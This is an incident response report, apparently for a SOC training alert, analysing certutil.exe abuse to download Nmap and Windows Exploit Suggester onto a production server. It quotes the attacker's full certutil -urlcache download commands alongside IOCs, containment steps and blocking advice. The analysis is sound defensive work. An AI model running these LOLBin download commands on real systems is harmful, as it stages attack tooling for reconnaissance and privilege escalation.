# Incident Response Report: SOC163 - Suspicious Certutil Usage (LOLBin)

**Incident ID**: SOC163 / EventID 113, **Date of Report**: "Jan 20, 2026",
**Analyst**: Steven Razanajatovo, **Severity**: High, 
**Status**: Closed, **Verdict**: True Positive

## Executive summary
On March 01, 2022, at 11:06 AM, the SOC received an alert (SOC163) regarding suspicious usage of the `certutil.exe` utility on the production server "**EricProd**" (172.16.17.22).

Investigation confirmed that a user utilized `certutil.exe` (a "Living off the Land" binary) to download offensive security tools from the internet. Specifically, the network scanner **Nmap** and the privilege escalation tool **Windows Exploit Suggester** were downloaded. The download of hacking tools onto a production server indicates an active compromise where the attacker is staging tools for reconnaissance and privilege escalation. The incident is classified as a True Positive.

## Incident overview
- **Alert Rule**: SOC163 - Suspicious Certutil.exe Usage

- **Event Time**: Mar 01, 2022, 11:06 AM

- **Hostname**: EricProd

- **IP Address**: 172.16.17.22

- **Binary**: `certutil.exe`

- **Trigger Reason**: `-f` parameter usage with `certutil`, commonly used to force-overwrite files during downloads.

## Investigation timeline & analysis
### Technique analysis (Ingress tool transfer)
The attacker employed `certutil.exe`, a legitimate Windows Certificate Authority tool, to bypass security controls and download files. The specific command flags `-urlcache -split -f` are a known signature for this LOLBin technique (MITRE ATT&CK T1105).

### Payload identification
Log analysis revealed two distinct download commands executed in succession:
1. **Reconnaissance Tool**:
- **Command**: `certutil.exe -urlcache -split -f https://nmap.org/dist/nmap-7.92-win32.zip nmap.zip`

- **Intent**: The attacker downloaded **Nmap**, likely to map the internal network and identify other vulnerable targets from the compromised host.

2. **Privilege escalation tool**:
- **Command**: `certutil.exe -urlcache -split -f https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py check.py`

- **Intent**: The attacker downloaded **Windows Exploit Suggester**, a Python script used to identify missing patches and potential privilege escalation vulnerabilities on the host system.

### Contextual analysis
- **Host**: The hostname **EricProd** implies this is a production server.

- **Verdict**: There is no legitimate business reason for a user to download Nmap or exploit scripts onto a production server using `certutil`. This confirms malicious intent.

## Indicators of compromise (IOCs)
The following artifacts identify the tools introduced by the attacker.
| Type  | Value  | Context  |
|---|---|---|
| Command  | `certutil.exe -urlcache -split -f ...`  | LOLBin Download Technique  |
| URL  | `https://nmap.org/dist/nmap-7.92-win32.zip`  | Tool Download (Nmap)  |
| URL  | `.../windows-exploit-suggester.py`  | Tool Download (Exploit Check)  |
| Filename  | `nmap.zip`  | Dropped file  |
| Filename  | `check.py`  | Dropped file  |

## Containment & remediation
- **Immediate Isolation**: Isolate EricProd (172.16.17.22) from the network to prevent the attacker from scanning the internal network or escalating privileges.

- **File Removal**: Delete `nmap.zip` and `check.py`.

- **Forensics**: Investigate the parent process that launched `certutil.exe` (likely `cmd.exe` or `powershell.exe`) to identify how the attacker initially gained access (e.g., RDP, Web Shell).

- **Credential Reset**: Force a password reset for the user account responsible for these commands.

## Recommendations
1. **Restrict LOLBins**: Monitor or block `certutil.exe` execution with the `-urlcache` flag via EDR or Group Policy, as this functionality is rarely used for legitimate certificate management by standard users.

2. **Network Segmentation**: Restrict production servers from initiating outbound connections to the internet (e.g., GitHub, Nmap.org) unless explicitly required and allow-listed.